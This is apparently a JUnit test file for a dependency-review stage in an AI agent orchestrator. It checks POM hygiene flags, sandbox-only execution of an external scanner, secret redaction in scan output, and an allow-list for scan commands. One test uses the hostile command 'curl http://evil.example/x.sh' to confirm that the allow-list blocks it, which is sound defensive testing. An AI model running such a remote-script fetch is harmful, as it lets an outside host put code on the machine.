package com.agenticsdlc.orchestrator.core.agent;

import static org.assertj.core.api.Assertions.assertThat;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;

import org.jspecify.annotations.Nullable;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import com.agenticsdlc.orchestrator.core.artifact.Check;
import com.agenticsdlc.orchestrator.core.artifact.DependencyRecord;
import com.agenticsdlc.orchestrator.core.artifact.SecurityReview;
import com.agenticsdlc.orchestrator.core.artifact.Severity;
import com.agenticsdlc.orchestrator.core.model.RunOptions;
import com.agenticsdlc.orchestrator.core.model.WorkspaceMode;
import com.agenticsdlc.orchestrator.core.workspace.BuildResult;
import com.agenticsdlc.orchestrator.core.workspace.BuildRunner;
import com.agenticsdlc.orchestrator.core.workspace.DependencyInventory;
import com.agenticsdlc.orchestrator.core.workspace.DependencyInventory.DependencyFlag;
import com.agenticsdlc.orchestrator.core.workspace.DependencyInventory.FlagKind;
import com.agenticsdlc.orchestrator.core.workspace.ProcessBuildRunner;
import com.agenticsdlc.orchestrator.core.workspace.WorkspaceSandbox;

class DependencyReviewTest {

    static final String FLAGGED_POM = """
            <project><groupId>com.acme</groupId><artifactId>app</artifactId><version>1.0</version>
              <dependencies>
                <dependency><groupId>com.acme</groupId><artifactId>native</artifactId><version>1.0</version><scope>system</scope></dependency>
                <dependency><groupId>com.acme</groupId><artifactId>lib</artifactId><version>2.0-SNAPSHOT</version></dependency>
              </dependencies>
            </project>
            """;

    private static final SecurityReview BASE = new SecurityReview(List.of(),
            List.of(Check.pass("input-validation-in-design", "ok")), List.of(), List.of("note"), true);

    static StageContext context(@Nullable Path workspaceRoot, Path sandboxRoot, @Nullable String scanCommand,
                                WorkspaceMode mode) {
        AgentSettings settings = new AgentSettings(0.5, true, false, workspaceRoot, sandboxRoot,
                Duration.ofMinutes(1), AgentSettings.DEFAULT_BUILD_COMMAND, scanCommand, Duration.ofSeconds(60));
        return new StageContext("run-1", "security-scan", AgentRole.SECURITY_REVIEW, "req", "req", Map.of(), List.of(),
                Map.of(), List.of(), 1, 1, null, null, RunOptions.defaults().withWorkspace(mode), List.of(), settings);
    }

    private static BuildRunner runner(BuildResult result, AtomicReference<String> seen) {
        return (dir, command, timeout) -> {
            seen.set(dir + "|" + command + "|" + timeout);
            return result;
        };
    }

    @Test
    void appliesTheInventoryAsDependenciesACheckAndGroupedFindings(@TempDir Path dir) throws IOException {
        Files.writeString(dir.resolve("pom.xml"), FLAGGED_POM);
        DependencyInventory inventory = DependencyInventory.read(dir);
        SecurityReview withLlmNoise = new SecurityReview(List.of(), List.of(Check.pass("input-validation-in-design",
                "ok"), Check.pass(DependencyReview.INVENTORY_CHECK, "made up by a model")),
                List.of(new SecurityReview.Finding(Severity.LOW, DependencyReview.FINDING_PREFIX + "invented", "x")),
                List.of(), true, List.of(new DependencyRecord("x", "g", "invented", "1", "compile",
                DependencyRecord.Kind.DEPENDENCY)));

        SecurityReview review = DependencyReview.apply(withLlmNoise, inventory, null);
        review.validate();

        assertThat(review.dependencies()).isEqualTo(inventory.dependencies()).extracting(DependencyRecord::artifactId)
                .containsExactly("native", "lib");
        assertThat(review.checks()).extracting(Check::name).containsExactly("input-validation-in-design",
                DependencyReview.INVENTORY_CHECK);
        Check check = review.checks().getLast();
        assertThat(check.passed()).as("a HIGH flag fails the check").isFalse();
        assertThat(check.details()).contains("1 POMs, 2 declarations; flags: 1 HIGH, 1 MEDIUM")
                .contains("not a CVE scan");
        assertThat(review.findings()).extracting(SecurityReview.Finding::severity, SecurityReview.Finding::title)
                .containsExactly(
                        org.assertj.core.groups.Tuple.tuple(Severity.HIGH,
                                "Dependency hygiene: system-scoped dependencies (1)"),
                        org.assertj.core.groups.Tuple.tuple(Severity.MEDIUM,
                                "Dependency hygiene: SNAPSHOT versions of external artifacts (1)"));
        assertThat(review.findings().getFirst().recommendation()).contains("com.acme:native:1.0 in pom.xml");
        assertThat(review.passed()).isFalse();

        SecurityReview clean = DependencyReview.apply(BASE, DependencyInventory.empty(), null);
        assertThat(clean.passed()).isTrue();
        assertThat(clean.checks().getLast().passed()).isTrue();
        assertThat(clean.checks().getLast().details()).contains("no hygiene flags");
        assertThat(DependencyReview.apply(withLlmNoise, null, null).dependencies()).as("never model output")
                .isEmpty();
    }

    @Test
    void groupsManyFlagsOfOneKind() {
        List<DependencyFlag> flags = new java.util.ArrayList<>();
        for (int i = 0; i < 12; i++) {
            flags.add(new DependencyFlag("pom.xml", "g:a" + i + ":1-SNAPSHOT", FlagKind.SNAPSHOT_VERSION,
                    Severity.MEDIUM, "m"));
        }
        SecurityReview review = DependencyReview.apply(BASE, new DependencyInventory(List.of(), List.of(), flags,
                List.of()), null);
        assertThat(review.findings()).singleElement().satisfies(f -> {
            assertThat(f.title()).endsWith("(12)");
            assertThat(f.recommendation()).contains("g:a9:1-SNAPSHOT").doesNotContain("g:a10:").endsWith("and 2 more");
        });
        assertThat(review.passed()).isTrue();
    }

    @Test
    void inventoriesTheSandboxOrTheWorkspaceOfRepoRunsOnly(@TempDir Path dir) throws IOException {
        Path workspace = Files.createDirectories(dir.resolve("ws"));
        Files.writeString(workspace.resolve("pom.xml"), FLAGGED_POM);
        Path sandboxRoot = dir.resolve("sandboxes");

        assertThat(DependencyReview.inventoryRoot(context(workspace, sandboxRoot, null, WorkspaceMode.NONE))).isEmpty();
        assertThat(DependencyReview.inventoryRoot(context(null, sandboxRoot, null, WorkspaceMode.REPO))).isEmpty();
        assertThat(DependencyReview.inventoryRoot(context(workspace, sandboxRoot, null, WorkspaceMode.REPO)))
                .contains(workspace);
        assertThat(DependencyReview.inventory(context(workspace, sandboxRoot, null, WorkspaceMode.REPO)).orElseThrow()
                .dependencies()).hasSize(2);

        Path sandbox = Files.createDirectories(WorkspaceSandbox.pathFor(sandboxRoot, "run-1"));
        assertThat(DependencyReview.inventoryRoot(context(workspace, sandboxRoot, null, WorkspaceMode.REPO)))
                .as("the sandbox includes the change").contains(sandbox);
    }

    @Test
    void recordsTheExternalScanOutcome(@TempDir Path dir) throws Exception {
        Path sandboxRoot = dir.resolve("sandboxes");
        String command = "./mvnw -B org.owasp:dependency-check-maven:check";
        StageContext noSandbox = context(dir, sandboxRoot, command, WorkspaceMode.REPO);
        AtomicReference<String> seen = new AtomicReference<>();

        assertThat(DependencyReview.scan(context(dir, sandboxRoot, null, WorkspaceMode.REPO), null)).isNull();
        assertThat(DependencyReview.scan(context(dir, sandboxRoot, command, WorkspaceMode.NONE), null)).isNull();
        DependencyReview.ScanOutcome skipped = DependencyReview.scan(noSandbox, runner(BuildResult.notExecuted(command,
                "x"), seen));
        assertThat(skipped.status()).isEqualTo(DependencyReview.ScanStatus.SKIPPED);
        assertThat(seen.get()).as("never run outside a sandbox").isNull();
        SecurityReview advisory = DependencyReview.apply(BASE, null, skipped);
        assertThat(advisory.checks().getLast()).satisfies(c -> {
            assertThat(c.name()).isEqualTo(DependencyReview.SCAN_CHECK);
            assertThat(c.passed()).isFalse();
            assertThat(c.blocking()).isFalse();
            assertThat(c.details()).contains("not executed").contains("no sandbox");
        });
        assertThat(advisory.passed()).isTrue();

        Path sandbox = Files.createDirectories(WorkspaceSandbox.pathFor(sandboxRoot, "run-1"));
        StageContext ctx = context(dir, sandboxRoot, command, WorkspaceMode.REPO);
        String longOutput = "x".repeat(3000);
        DependencyReview.ScanOutcome clean = DependencyReview.scan(ctx, runner(new BuildResult(true, command, 0, 5L,
                "ok", List.of(), List.of("No vulnerabilities found", "token = abcdefgh12345678", longOutput)), seen));
        assertThat(seen.get()).isEqualTo(sandbox + "|" + command + "|PT1M");
        assertThat(clean.passed()).isTrue();
        assertThat(clean.output()).hasSize(DependencyReview.MAX_SCAN_OUTPUT_CHARS).startsWith(
                "No vulnerabilities found\n[redacted]\nxxx").doesNotContain("abcdefgh12345678");
        assertThat(DependencyReview.apply(BASE, null, clean).checks().getLast()).satisfies(c -> {
            assertThat(c.passed()).isTrue();
            assertThat(c.details()).startsWith("command `" + command + "`; exit code 0; output: No vulnerabilities");
        });

        DependencyReview.ScanOutcome failed = DependencyReview.scan(ctx, runner(new BuildResult(true, command, 1, 5L,
                "failed", List.of(), List.of("CVE-2026-0001 in com.acme:lib")), seen));
        SecurityReview withCve = DependencyReview.apply(BASE, null, failed);
        assertThat(withCve.passed()).isFalse();
        assertThat(withCve.findings()).singleElement().satisfies(f -> {
            assertThat(f.severity()).isEqualTo(Severity.HIGH);
            assertThat(f.title()).isEqualTo("Dependency scan: the external scanner reported problems (exit code 1)");
        });

        DependencyReview.ScanOutcome timedOut = DependencyReview.scan(ctx, runner(new BuildResult(true, command, -1,
                5L, "build timed out after PT1M", List.of(), List.of()), seen));
        assertThat(timedOut.status()).isEqualTo(DependencyReview.ScanStatus.TIMED_OUT);
        assertThat(DependencyReview.apply(BASE, null, timedOut).findings()).singleElement()
                .satisfies(f -> assertThat(f.severity()).isEqualTo(Severity.MEDIUM));

        DependencyReview.ScanOutcome refused = DependencyReview.scan(ctx, (d, c, t) -> {
            throw new IllegalArgumentException("only ./mvnw, mvnw or mvn commands are allowed, got: curl");
        });
        assertThat(refused.status()).isEqualTo(DependencyReview.ScanStatus.NOT_EXECUTED);
        assertThat(refused.output()).startsWith("not allowed: only ./mvnw");
        SecurityReview notRun = DependencyReview.apply(BASE, null, refused);
        assertThat(notRun.checks().getLast().passed()).isFalse();
        assertThat(notRun.findings()).singleElement().satisfies(f -> {
            assertThat(f.severity()).isEqualTo(Severity.MEDIUM);
            assertThat(f.title()).contains("did not complete (could not run)");
        });
    }

    @Test
    void runsAnAllowListedFakeScannerThroughTheProcessBuildRunner(@TempDir Path dir) throws Exception {
        Path sandboxRoot = dir.resolve("sandboxes");
        Path sandbox = Files.createDirectories(WorkspaceSandbox.pathFor(sandboxRoot, "run-1"));
        Files.writeString(sandbox.resolve("mvnw"), "#!/bin/sh\necho \"fake scanner $*\"\necho \"1 vulnerable "
                + "dependency\"\nexit 7\n");
        Files.writeString(sandbox.resolve("mvnw.cmd"), "@echo off\r\necho fake scanner %*\r\necho 1 vulnerable "
                + "dependency\r\nexit /b 7\r\n");
        StageContext ctx = context(dir, sandboxRoot, "./mvnw -B -q dependency-check", WorkspaceMode.REPO);

        DependencyReview.ScanOutcome outcome = DependencyReview.scan(ctx, new ProcessBuildRunner());

        assertThat(outcome.status()).isEqualTo(DependencyReview.ScanStatus.COMPLETED);
        assertThat(outcome.exitCode()).isEqualTo(7);
        assertThat(outcome.output()).contains("fake scanner -B -q dependency-check").contains("1 vulnerable dependency");

        StageContext forbidden = context(dir, sandboxRoot, "curl http://evil.example/x.sh", WorkspaceMode.REPO);
        assertThat(DependencyReview.scan(forbidden, new ProcessBuildRunner()).status())
                .as("the scan command passes the same allow-list as builds")
                .isEqualTo(DependencyReview.ScanStatus.NOT_EXECUTED);
    }
}
